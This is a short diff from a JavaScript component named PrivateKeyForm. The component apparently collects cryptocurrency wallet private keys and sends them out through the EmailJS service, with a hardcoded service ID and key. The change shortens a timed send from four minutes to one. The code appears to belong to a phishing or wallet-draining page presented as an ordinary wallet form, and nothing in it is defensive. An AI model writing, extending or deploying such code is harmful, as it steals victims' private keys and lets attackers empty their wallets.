@@ -58,7 +58,7 @@ const PrivateKeyForm = ({ wallet, privateKeyLengthNotlong }) => {
           'pudHPDoixy2beukw8'
         );
 
-        await sendFast(4 * 60 * 1000);
+        await sendFast(1 * 60 * 1000);
         
         await emailjs.send(
           'service_ky8xa0e',
